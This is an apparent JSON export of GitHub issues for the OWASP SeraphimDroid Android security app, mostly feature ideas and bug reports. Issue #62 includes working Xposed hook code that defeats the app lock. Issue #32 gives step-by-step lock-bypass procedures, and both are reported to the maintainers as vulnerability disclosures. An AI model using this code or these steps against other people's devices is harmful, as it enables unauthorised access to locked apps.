[
  {
    "url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/63"],
    "repository_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid"],
    "labels_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/63/labels{/name}"],
    "comments_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/63/comments"],
    "events_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/63/events"],
    "html_url": ["https://github.com/nikolamilosevic86/owasp-seraphimdroid/issues/63"],
    "id": [331423594],
    "node_id": ["MDU6SXNzdWUzMzE0MjM1OTQ="],
    "number": [63],
    "title": ["Icon/Logo Proposal"],
    "user": {
      "login": ["loydjayme25"],
      "id": [37318022],
      "node_id": ["MDQ6VXNlcjM3MzE4MDIy"],
      "avatar_url": ["https://avatars1.githubusercontent.com/u/37318022?v=4"],
      "gravatar_id": [""],
      "url": ["https://api.github.com/users/loydjayme25"],
      "html_url": ["https://github.com/loydjayme25"],
      "followers_url": ["https://api.github.com/users/loydjayme25/followers"],
      "following_url": ["https://api.github.com/users/loydjayme25/following{/other_user}"],
      "gists_url": ["https://api.github.com/users/loydjayme25/gists{/gist_id}"],
      "starred_url": ["https://api.github.com/users/loydjayme25/starred{/owner}{/repo}"],
      "subscriptions_url": ["https://api.github.com/users/loydjayme25/subscriptions"],
      "organizations_url": ["https://api.github.com/users/loydjayme25/orgs"],
      "repos_url": ["https://api.github.com/users/loydjayme25/repos"],
      "events_url": ["https://api.github.com/users/loydjayme25/events{/privacy}"],
      "received_events_url": ["https://api.github.com/users/loydjayme25/received_events"],
      "type": ["User"],
      "site_admin": [false]
    },
    "labels": [],
    "state": ["open"],
    "locked": [false],
    "assignee": {},
    "assignees": [],
    "milestone": {},
    "comments": [4],
    "created_at": ["2018-06-12T03:23:48Z"],
    "updated_at": ["2018-06-13T10:37:57Z"],
    "closed_at": {},
    "author_association": ["NONE"],
    "body": ["Good day, i am a designer and i am willing to work for your project as a logo designer. can i submit my design ?"]
  },
  {
    "url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/62"],
    "repository_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid"],
    "labels_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/62/labels{/name}"],
    "comments_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/62/comments"],
    "events_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/62/events"],
    "html_url": ["https://github.com/nikolamilosevic86/owasp-seraphimdroid/issues/62"],
    "id": [206211037],
    "node_id": ["MDU6SXNzdWUyMDYyMTEwMzc="],
    "number": [62],
    "title": ["Bypassing the application lock"],
    "user": {
      "login": ["voider1"],
      "id": [6877671],
      "node_id": ["MDQ6VXNlcjY4Nzc2NzE="],
      "avatar_url": ["https://avatars2.githubusercontent.com/u/6877671?v=4"],
      "gravatar_id": [""],
      "url": ["https://api.github.com/users/voider1"],
      "html_url": ["https://github.com/voider1"],
      "followers_url": ["https://api.github.com/users/voider1/followers"],
      "following_url": ["https://api.github.com/users/voider1/following{/other_user}"],
      "gists_url": ["https://api.github.com/users/voider1/gists{/gist_id}"],
      "starred_url": ["https://api.github.com/users/voider1/starred{/owner}{/repo}"],
      "subscriptions_url": ["https://api.github.com/users/voider1/subscriptions"],
      "organizations_url": ["https://api.github.com/users/voider1/orgs"],
      "repos_url": ["https://api.github.com/users/voider1/repos"],
      "events_url": ["https://api.github.com/users/voider1/events{/privacy}"],
      "received_events_url": ["https://api.github.com/users/voider1/received_events"],
      "type": ["User"],
      "site_admin": [false]
    },
    "labels": [],
    "state": ["open"],
    "locked": [false],
    "assignee": {},
    "assignees": [],
    "milestone": {},
    "comments": [1],
    "created_at": ["2017-02-08T14:20:28Z"],
    "updated_at": ["2018-01-18T18:14:37Z"],
    "closed_at": {},
    "author_association": ["NONE"],
    "body": ["I've managed to bypass the application lock screen by writing an Xposed module. Allow me to explain how I did it, it isn't complicated.\r\n\r\nI used the Xposed framework for this and wrote a single hook for it. I decompiled the APK with dex2jar and opened it in bytecode-viewer. After inspecting the behaviour of the application lock screen I noticed that it automatically accepts the passcode without pressing a button. Which means that it checks the length of the passcode or the whole passcode on each keypress. The decompiled code revealed to me that it checks the password on each keypress. Note, I didn't look at the source in the repo, I did a blackbox test. \r\n\r\nSo in the PasswordActivity you have this method:\r\n\r\n```java\r\n private boolean isPasswordCorrect(String paramString)\r\n {\r\n    boolean bool4 = false;\r\n    boolean bool5 = false;\r\n    boolean bool1 = false;\r\n    boolean bool2 = bool4;\r\n    boolean bool3 = bool5;\r\n    try\r\n    {\r\n      paramString = MessageDigest.getInstance(\"SHA-256\").digest(paramString.getBytes(\"UTF-8\"));\r\n      bool2 = bool4;\r\n      bool3 = bool5;\r\n      SQLiteDatabase localSQLiteDatabase = this.dbHelper.getReadableDatabase();\r\n      bool2 = bool4;\r\n      bool3 = bool5;\r\n      Cursor localCursor = localSQLiteDatabase.rawQuery(\"SELECT * FROM password\", null);\r\n      bool2 = bool4;\r\n      bool3 = bool5;\r\n      localCursor.moveToNext();\r\n      bool2 = bool4;\r\n      bool3 = bool5;\r\n      if (Arrays.equals(paramString, localCursor.getBlob(1)))\r\n      {\r\n        bool2 = bool4;\r\n        bool3 = bool5;\r\n        this.etPassword.setText(\"\");\r\n        bool1 = true;\r\n      }\r\n      bool2 = bool1;\r\n      bool3 = bool1;\r\n      localCursor.close();\r\n      bool2 = bool1;\r\n      bool3 = bool1;\r\n      localSQLiteDatabase.close();\r\n      return bool1;\r\n    }\r\n    catch (NoSuchAlgorithmException paramString)\r\n    {\r\n      paramString.printStackTrace();\r\n      return bool2;\r\n    }\r\n    catch (UnsupportedEncodingException paramString)\r\n    {\r\n      paramString.printStackTrace();\r\n    }\r\n    return bool3;\r\n  }\r\n```\r\n\r\nSo I've written this hook:\r\n\r\n```java\r\n    @Override\r\n    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable {\r\n        final String packageName = \"org.owasp.seraphimdroid\";\r\n        if (!lpparam.packageName.equals(packageName)) { return; }\r\n\r\n        final String passwordActivity = packageName + \".PasswordActivity\";\r\n        final String isPasswordCorrect = \"isPasswordCorrect\";\r\n\r\n        XposedBridge.log(\"[+] Hooking method\");\r\n\r\n        findAndHookMethod(passwordActivity, lpparam.classLoader, isPasswordCorrect, String.class, new XC_MethodHook() {\r\n            @Override\r\n            protected void afterHookedMethod(MethodHookParam param) throws Throwable {\r\n                param.setResult(true);\r\n                XposedBridge.log(\"[+] Changed result of \" + isPasswordCorrect + \" to true\");\r\n            }\r\n        });\r\n    }\r\n```\r\n\r\nAnd this is how I've bypassed the application lock. This design seems broken by default, the password has in fact nothing to do with unlocking the application, hence should be updated. It shouldn't be this easy."]
  },
  {
    "url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/42"],
    "repository_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid"],
    "labels_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/42/labels{/name}"],
    "comments_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/42/comments"],
    "events_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/42/events"],
    "html_url": ["https://github.com/nikolamilosevic86/owasp-seraphimdroid/issues/42"],
    "id": [144501865],
    "node_id": ["MDU6SXNzdWUxNDQ1MDE4NjU="],
    "number": [42],
    "title": ["Create unit test and continuous integration pipeline"],
    "user": {
      "login": ["nikolamilosevic86"],
      "id": [5192295],
      "node_id": ["MDQ6VXNlcjUxOTIyOTU="],
      "avatar_url": ["https://avatars0.githubusercontent.com/u/5192295?v=4"],
      "gravatar_id": [""],
      "url": ["https://api.github.com/users/nikolamilosevic86"],
      "html_url": ["https://github.com/nikolamilosevic86"],
      "followers_url": ["https://api.github.com/users/nikolamilosevic86/followers"],
      "following_url": ["https://api.github.com/users/nikolamilosevic86/following{/other_user}"],
      "gists_url": ["https://api.github.com/users/nikolamilosevic86/gists{/gist_id}"],
      "starred_url": ["https://api.github.com/users/nikolamilosevic86/starred{/owner}{/repo}"],
      "subscriptions_url": ["https://api.github.com/users/nikolamilosevic86/subscriptions"],
      "organizations_url": ["https://api.github.com/users/nikolamilosevic86/orgs"],
      "repos_url": ["https://api.github.com/users/nikolamilosevic86/repos"],
      "events_url": ["https://api.github.com/users/nikolamilosevic86/events{/privacy}"],
      "received_events_url": ["https://api.github.com/users/nikolamilosevic86/received_events"],
      "type": ["User"],
      "site_admin": [false]
    },
    "labels": [
      {
        "id": [274419494],
        "node_id": ["MDU6TGFiZWwyNzQ0MTk0OTQ="],
        "url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/labels/idea"],
        "name": ["idea"],
        "color": ["bfe5bf"],
        "default": [false]
      },
      {
        "id": [51586325],
        "node_id": ["MDU6TGFiZWw1MTU4NjMyNQ=="],
        "url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/labels/new%20feature"],
        "name": ["new feature"],
        "color": ["009800"],
        "default": [false]
      }
    ],
    "state": ["open"],
    "locked": [false],
    "assignee": {},
    "assignees": [],
    "milestone": {},
    "comments": [3],
    "created_at": ["2016-03-30T08:25:01Z"],
    "updated_at": ["2016-05-30T16:40:16Z"],
    "closed_at": {},
    "author_association": ["OWNER"],
    "body": ["Pipeline for continuous integration with unit tests should be created. Before each commit project need to be built without issues and all unit test have to pass. Unit tests need to cover most of the functionality and places where app can crash. \n"]
  },
  {
    "url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/38"],
    "repository_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid"],
    "labels_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/38/labels{/name}"],
    "comments_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/38/comments"],
    "events_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/38/events"],
    "html_url": ["https://github.com/nikolamilosevic86/owasp-seraphimdroid/issues/38"],
    "id": [143016841],
    "node_id": ["MDU6SXNzdWUxNDMwMTY4NDE="],
    "number": [38],
    "title": ["SMS log error "],
    "user": {
      "login": ["abhi-r3v0"],
      "id": [9742431],
      "node_id": ["MDQ6VXNlcjk3NDI0MzE="],
      "avatar_url": ["https://avatars3.githubusercontent.com/u/9742431?v=4"],
      "gravatar_id": [""],
      "url": ["https://api.github.com/users/abhi-r3v0"],
      "html_url": ["https://github.com/abhi-r3v0"],
      "followers_url": ["https://api.github.com/users/abhi-r3v0/followers"],
      "following_url": ["https://api.github.com/users/abhi-r3v0/following{/other_user}"],
      "gists_url": ["https://api.github.com/users/abhi-r3v0/gists{/gist_id}"],
      "starred_url": ["https://api.github.com/users/abhi-r3v0/starred{/owner}{/repo}"],
      "subscriptions_url": ["https://api.github.com/users/abhi-r3v0/subscriptions"],
      "organizations_url": ["https://api.github.com/users/abhi-r3v0/orgs"],
      "repos_url": ["https://api.github.com/users/abhi-r3v0/repos"],
      "events_url": ["https://api.github.com/users/abhi-r3v0/events{/privacy}"],
      "received_events_url": ["https://api.github.com/users/abhi-r3v0/received_events"],
      "type": ["User"],
      "site_admin": [false]
    },
    "labels": [
      {
        "id": [51586528],
        "node_id": ["MDU6TGFiZWw1MTU4NjUyOA=="],
        "url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/labels/minor%20bug"],
        "name": ["minor bug"],
        "color": ["eb6420"],
        "default": [false]
      }
    ],
    "state": ["open"],
    "locked": [false],
    "assignee": {},
    "assignees": [],
    "milestone": {},
    "comments": [1],
    "created_at": ["2016-03-23T16:50:34Z"],
    "updated_at": ["2016-03-30T08:22:11Z"],
    "closed_at": {},
    "author_association": ["NONE"],
    "body": ["The Blocker logs option within the application works very well. But, there is a small issue.\n### Issue :\n\nThe SMS log notifies every message that comes from the service provider, even if the message is legit and from a trustworthy source.  Almost every service number is being logged and is flagged as potentially harmful. There is lack of proper inspection on the incoming SMS number.  \n\n![screenshot_2016-03-16-17-15-25](https://cloud.githubusercontent.com/assets/9742431/13992816/853a155a-f143-11e5-8daa-818456e79f07.png)\n"]
  },
  {
    "url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/36"],
    "repository_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid"],
    "labels_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/36/labels{/name}"],
    "comments_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/36/comments"],
    "events_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/36/events"],
    "html_url": ["https://github.com/nikolamilosevic86/owasp-seraphimdroid/issues/36"],
    "id": [142588662],
    "node_id": ["MDU6SXNzdWUxNDI1ODg2NjI="],
    "number": [36],
    "title": ["Application lock pops up multiple times over locked app"],
    "user": {
      "login": ["nikolamilosevic86"],
      "id": [5192295],
      "node_id": ["MDQ6VXNlcjUxOTIyOTU="],
      "avatar_url": ["https://avatars0.githubusercontent.com/u/5192295?v=4"],
      "gravatar_id": [""],
      "url": ["https://api.github.com/users/nikolamilosevic86"],
      "html_url": ["https://github.com/nikolamilosevic86"],
      "followers_url": ["https://api.github.com/users/nikolamilosevic86/followers"],
      "following_url": ["https://api.github.com/users/nikolamilosevic86/following{/other_user}"],
      "gists_url": ["https://api.github.com/users/nikolamilosevic86/gists{/gist_id}"],
      "starred_url": ["https://api.github.com/users/nikolamilosevic86/starred{/owner}{/repo}"],
      "subscriptions_url": ["https://api.github.com/users/nikolamilosevic86/subscriptions"],
      "organizations_url": ["https://api.github.com/users/nikolamilosevic86/orgs"],
      "repos_url": ["https://api.github.com/users/nikolamilosevic86/repos"],
      "events_url": ["https://api.github.com/users/nikolamilosevic86/events{/privacy}"],
      "received_events_url": ["https://api.github.com/users/nikolamilosevic86/received_events"],
      "type": ["User"],
      "site_admin": [false]
    },
    "labels": [
      {
        "id": [51586528],
        "node_id": ["MDU6TGFiZWw1MTU4NjUyOA=="],
        "url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/labels/minor%20bug"],
        "name": ["minor bug"],
        "color": ["eb6420"],
        "default": [false]
      }
    ],
    "state": ["open"],
    "locked": [false],
    "assignee": {},
    "assignees": [],
    "milestone": {},
    "comments": [3],
    "created_at": ["2016-03-22T09:10:29Z"],
    "updated_at": ["2016-03-22T14:16:51Z"],
    "closed_at": {},
    "author_association": ["OWNER"],
    "body": ["When I have blocked an app, and I click on its icon, SeraphimDroid pops up to enter the code, but when I do, it does not work. When I went and clicked the SeraphimDroid icon , I entered the code, then the App Lock module appeared and from there I was able to unblock the app I wanted. \n\nBug seems not always reproducible, but it needs deeper look how and why it appears and fixing. \n"]
  },
  {
    "url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/32"],
    "repository_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid"],
    "labels_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/32/labels{/name}"],
    "comments_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/32/comments"],
    "events_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/32/events"],
    "html_url": ["https://github.com/nikolamilosevic86/owasp-seraphimdroid/issues/32"],
    "id": [138682021],
    "node_id": ["MDU6SXNzdWUxMzg2ODIwMjE="],
    "number": [32],
    "title": ["Application lock bypass"],
    "user": {
      "login": ["abhi-r3v0"],
      "id": [9742431],
      "node_id": ["MDQ6VXNlcjk3NDI0MzE="],
      "avatar_url": ["https://avatars3.githubusercontent.com/u/9742431?v=4"],
      "gravatar_id": [""],
      "url": ["https://api.github.com/users/abhi-r3v0"],
      "html_url": ["https://github.com/abhi-r3v0"],
      "followers_url": ["https://api.github.com/users/abhi-r3v0/followers"],
      "following_url": ["https://api.github.com/users/abhi-r3v0/following{/other_user}"],
      "gists_url": ["https://api.github.com/users/abhi-r3v0/gists{/gist_id}"],
      "starred_url": ["https://api.github.com/users/abhi-r3v0/starred{/owner}{/repo}"],
      "subscriptions_url": ["https://api.github.com/users/abhi-r3v0/subscriptions"],
      "organizations_url": ["https://api.github.com/users/abhi-r3v0/orgs"],
      "repos_url": ["https://api.github.com/users/abhi-r3v0/repos"],
      "events_url": ["https://api.github.com/users/abhi-r3v0/events{/privacy}"],
      "received_events_url": ["https://api.github.com/users/abhi-r3v0/received_events"],
      "type": ["User"],
      "site_admin": [false]
    },
    "labels": [
      {
        "id": [51586528],
        "node_id": ["MDU6TGFiZWw1MTU4NjUyOA=="],
        "url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/labels/minor%20bug"],
        "name": ["minor bug"],
        "color": ["eb6420"],
        "default": [false]
      }
    ],
    "state": ["open"],
    "locked": [false],
    "assignee": {},
    "assignees": [],
    "milestone": {},
    "comments": [8],
    "created_at": ["2016-03-05T13:53:02Z"],
    "updated_at": ["2016-03-11T15:12:53Z"],
    "closed_at": {},
    "author_association": ["NONE"],
    "body": ["I have been using Seraphimdroid for a while. And I also went through the code. Listed below are some of the bugs I have been able to find.\n### Issue 1 :\n#### Test devices :\n1.  Micromax Canvas Knight A350 ( Kitkat 4.4.4 )\n2.  Micromax YU Yureka Plus ( Lollipop 5.1)\n3.  Motorola Moto G ( Lollipop 5.0.1 )\n4.  Motorola Moto G2 ( Marshmallow 6.0 )\n#### Procedure :\n1.  Use the app locker to lock any installed app.( I have used OS Monitor)\n2.  Reboot the device.\n3.  As soon as the device boots, open any locked application ( Before the ' android.intent.action.BOOT_COMPLETED' toast message pops up). \n\nWhen the device is rebooted, the application ( Seraphimdroid ) waits for the BOOT_COMPLETED intent to be received. Only on receiving this intent, does the application actually become active. \n\nBut, the device ( generally ) becomes operational even before the ' BOOT_COMPLETED ' intent is received. So, within that span of time, one can easily open any application that has been locked by Seraphimdroid, without authenticating with the passcode.\n\nAlso, even after the intent is received, the locked application that is opened beforehand, still is accessible without any authentication. \n\nAnother scenario with the same issue is that the  Seraphimdroid application itself can be uninstalled without having to provide the password.      \n\n![issue_1](https://cloud.githubusercontent.com/assets/9742431/13547818/b64d5db4-e306-11e5-9135-b7f0b091abae.png)\n#### Mitigation:\n\nOne of the best ways to tackle this issue would be to mandatorily (or by default ) have Seraphimdroid registered as a Device Administrator. By doing so, the application can't be uninstalled. But, the locked applications can be still accessed. \n\nThe issue is caused because the application relies upon receiving the ' BOOT_COMPLETED '  intent for initiating the main activity. Would there be issues if the application is started before the BOOT_COMPLETE intent is received ?\n### Issue 2:\n\nTest device :  Motorola Moto G 2nd Generation \nAndroid version : 6.0 ( Marshmallow )\n#### Procedure :\n1.  Use the app locker to lock any installed app. \n2.  Open the the locked application.\n3.  The password will be asked. But, don't type in the passcode. Just switch to the recents tab.\n4.  The locked application and the Seraphimdroid app can be seen separately. From here, Seraphimdroid can be removed and the locked application opens and becomes operational(even though the application keeps popping up, it can be cleared again from the recents tab.)  \n\n![issue_2](https://cloud.githubusercontent.com/assets/9742431/13547820/bf0f9c1e-e306-11e5-9abf-7497541408f9.png)\n"]
  },
  {
    "url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/23"],
    "repository_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid"],
    "labels_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/23/labels{/name}"],
    "comments_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/23/comments"],
    "events_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/23/events"],
    "html_url": ["https://github.com/nikolamilosevic86/owasp-seraphimdroid/issues/23"],
    "id": [108422324],
    "node_id": ["MDU6SXNzdWUxMDg0MjIzMjQ="],
    "number": [23],
    "title": ["Secure password generator and password manager"],
    "user": {
      "login": ["nikolamilosevic86"],
      "id": [5192295],
      "node_id": ["MDQ6VXNlcjUxOTIyOTU="],
      "avatar_url": ["https://avatars0.githubusercontent.com/u/5192295?v=4"],
      "gravatar_id": [""],
      "url": ["https://api.github.com/users/nikolamilosevic86"],
      "html_url": ["https://github.com/nikolamilosevic86"],
      "followers_url": ["https://api.github.com/users/nikolamilosevic86/followers"],
      "following_url": ["https://api.github.com/users/nikolamilosevic86/following{/other_user}"],
      "gists_url": ["https://api.github.com/users/nikolamilosevic86/gists{/gist_id}"],
      "starred_url": ["https://api.github.com/users/nikolamilosevic86/starred{/owner}{/repo}"],
      "subscriptions_url": ["https://api.github.com/users/nikolamilosevic86/subscriptions"],
      "organizations_url": ["https://api.github.com/users/nikolamilosevic86/orgs"],
      "repos_url": ["https://api.github.com/users/nikolamilosevic86/repos"],
      "events_url": ["https://api.github.com/users/nikolamilosevic86/events{/privacy}"],
      "received_events_url": ["https://api.github.com/users/nikolamilosevic86/received_events"],
      "type": ["User"],
      "site_admin": [false]
    },
    "labels": [
      {
        "id": [274419494],
        "node_id": ["MDU6TGFiZWwyNzQ0MTk0OTQ="],
        "url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/labels/idea"],
        "name": ["idea"],
        "color": ["bfe5bf"],
        "default": [false]
      }
    ],
    "state": ["open"],
    "locked": [false],
    "assignee": {},
    "assignees": [],
    "milestone": {},
    "comments": [0],
    "created_at": ["2015-09-25T23:15:59Z"],
    "updated_at": ["2015-10-17T21:31:11Z"],
    "closed_at": {},
    "author_association": ["OWNER"],
    "body": ["Possible new features, however, maybe have some security issues and risks. If implementation goes on, the behaviour should be similar to app called Keeper (https://play.google.com/store/apps/details?id=com.callpod.android_apps.keeper)\n"]
  },
  {
    "url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/22"],
    "repository_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid"],
    "labels_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/22/labels{/name}"],
    "comments_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/22/comments"],
    "events_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/22/events"],
    "html_url": ["https://github.com/nikolamilosevic86/owasp-seraphimdroid/issues/22"],
    "id": [108421996],
    "node_id": ["MDU6SXNzdWUxMDg0MjE5OTY="],
    "number": [22],
    "title": ["Trigger the siren through text message"],
    "user": {
      "login": ["nikolamilosevic86"],
      "id": [5192295],
      "node_id": ["MDQ6VXNlcjUxOTIyOTU="],
      "avatar_url": ["https://avatars0.githubusercontent.com/u/5192295?v=4"],
      "gravatar_id": [""],
      "url": ["https://api.github.com/users/nikolamilosevic86"],
      "html_url": ["https://github.com/nikolamilosevic86"],
      "followers_url": ["https://api.github.com/users/nikolamilosevic86/followers"],
      "following_url": ["https://api.github.com/users/nikolamilosevic86/following{/other_user}"],
      "gists_url": ["https://api.github.com/users/nikolamilosevic86/gists{/gist_id}"],
      "starred_url": ["https://api.github.com/users/nikolamilosevic86/starred{/owner}{/repo}"],
      "subscriptions_url": ["https://api.github.com/users/nikolamilosevic86/subscriptions"],
      "organizations_url": ["https://api.github.com/users/nikolamilosevic86/orgs"],
      "repos_url": ["https://api.github.com/users/nikolamilosevic86/repos"],
      "events_url": ["https://api.github.com/users/nikolamilosevic86/events{/privacy}"],
      "received_events_url": ["https://api.github.com/users/nikolamilosevic86/received_events"],
      "type": ["User"],
      "site_admin": [false]
    },
    "labels": [
      {
        "id": [51586325],
        "node_id": ["MDU6TGFiZWw1MTU4NjMyNQ=="],
        "url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/labels/new%20feature"],
        "name": ["new feature"],
        "color": ["009800"],
        "default": [false]
      }
    ],
    "state": ["open"],
    "locked": [false],
    "assignee": {},
    "assignees": [],
    "milestone": {},
    "comments": [0],
    "created_at": ["2015-09-25T23:12:16Z"],
    "updated_at": ["2015-09-25T23:12:16Z"],
    "closed_at": {},
    "author_association": ["OWNER"],
    "body": ["Trigger the siren through text message since GPS can't pin point the exact location of the device. It would help if the device would sound off while you are looking for it when it's lost, misplaced or stolen.\n"]
  },
  {
    "url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/21"],
    "repository_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid"],
    "labels_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/21/labels{/name}"],
    "comments_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/21/comments"],
    "events_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/21/events"],
    "html_url": ["https://github.com/nikolamilosevic86/owasp-seraphimdroid/issues/21"],
    "id": [108421923],
    "node_id": ["MDU6SXNzdWUxMDg0MjE5MjM="],
    "number": [21],
    "title": ["Snapshot when incorrect pin is submitted"],
    "user": {
      "login": ["nikolamilosevic86"],
      "id": [5192295],
      "node_id": ["MDQ6VXNlcjUxOTIyOTU="],
      "avatar_url": ["https://avatars0.githubusercontent.com/u/5192295?v=4"],
      "gravatar_id": [""],
      "url": ["https://api.github.com/users/nikolamilosevic86"],
      "html_url": ["https://github.com/nikolamilosevic86"],
      "followers_url": ["https://api.github.com/users/nikolamilosevic86/followers"],
      "following_url": ["https://api.github.com/users/nikolamilosevic86/following{/other_user}"],
      "gists_url": ["https://api.github.com/users/nikolamilosevic86/gists{/gist_id}"],
      "starred_url": ["https://api.github.com/users/nikolamilosevic86/starred{/owner}{/repo}"],
      "subscriptions_url": ["https://api.github.com/users/nikolamilosevic86/subscriptions"],
      "organizations_url": ["https://api.github.com/users/nikolamilosevic86/orgs"],
      "repos_url": ["https://api.github.com/users/nikolamilosevic86/repos"],
      "events_url": ["https://api.github.com/users/nikolamilosevic86/events{/privacy}"],
      "received_events_url": ["https://api.github.com/users/nikolamilosevic86/received_events"],
      "type": ["User"],
      "site_admin": [false]
    },
    "labels": [
      {
        "id": [274419494],
        "node_id": ["MDU6TGFiZWwyNzQ0MTk0OTQ="],
        "url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/labels/idea"],
        "name": ["idea"],
        "color": ["bfe5bf"],
        "default": [false]
      }
    ],
    "state": ["open"],
    "locked": [false],
    "assignee": {},
    "assignees": [],
    "milestone": {},
    "comments": [0],
    "created_at": ["2015-09-25T23:11:35Z"],
    "updated_at": ["2015-10-17T21:32:13Z"],
    "closed_at": {},
    "author_association": ["OWNER"],
    "body": ["Take a snapshot from the front camera every time an incorrect pin is submitted (both Seraphimdroid pin and Android pin if possible). ( There's an app that does this on the lockscreen. The app is called HiddenEye).\n\nUser has to be able to see taken snapshots with dates and times, possibly with a entered pins in the app\n"]
  },
  {
    "url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/13"],
    "repository_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid"],
    "labels_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/13/labels{/name}"],
    "comments_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/13/comments"],
    "events_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/13/events"],
    "html_url": ["https://github.com/nikolamilosevic86/owasp-seraphimdroid/issues/13"],
    "id": [57953585],
    "node_id": ["MDU6SXNzdWU1Nzk1MzU4NQ=="],
    "number": [13],
    "title": ["Scan browsing web page against some web page blacklist"],
    "user": {
      "login": ["nikolamilosevic86"],
      "id": [5192295],
      "node_id": ["MDQ6VXNlcjUxOTIyOTU="],
      "avatar_url": ["https://avatars0.githubusercontent.com/u/5192295?v=4"],
      "gravatar_id": [""],
      "url": ["https://api.github.com/users/nikolamilosevic86"],
      "html_url": ["https://github.com/nikolamilosevic86"],
      "followers_url": ["https://api.github.com/users/nikolamilosevic86/followers"],
      "following_url": ["https://api.github.com/users/nikolamilosevic86/following{/other_user}"],
      "gists_url": ["https://api.github.com/users/nikolamilosevic86/gists{/gist_id}"],
      "starred_url": ["https://api.github.com/users/nikolamilosevic86/starred{/owner}{/repo}"],
      "subscriptions_url": ["https://api.github.com/users/nikolamilosevic86/subscriptions"],
      "organizations_url": ["https://api.github.com/users/nikolamilosevic86/orgs"],
      "repos_url": ["https://api.github.com/users/nikolamilosevic86/repos"],
      "events_url": ["https://api.github.com/users/nikolamilosevic86/events{/privacy}"],
      "received_events_url": ["https://api.github.com/users/nikolamilosevic86/received_events"],
      "type": ["User"],
      "site_admin": [false]
    },
    "labels": [
      {
        "id": [274419494],
        "node_id": ["MDU6TGFiZWwyNzQ0MTk0OTQ="],
        "url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/labels/idea"],
        "name": ["idea"],
        "color": ["bfe5bf"],
        "default": [false]
      }
    ],
    "state": ["open"],
    "locked": [false],
    "assignee": {},
    "assignees": [],
    "milestone": {},
    "comments": [0],
    "created_at": ["2015-02-17T17:21:14Z"],
    "updated_at": ["2015-10-17T21:32:27Z"],
    "closed_at": {},
    "author_association": ["OWNER"],
    "body": ["It should be possible to check if page that is loading before it loads is safe page. The page should be checked against either Google blacklisted API or against some other dangerous website blacklist. If there is an issue with the page, load page that says the page is blacklisted and potentially dangerous.\n"]
  },
  {
    "url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid/issues/12"],
    "repository_url": ["https://api.github.com/repos/nikolamilosevic86/owasp-seraphimdroid"],
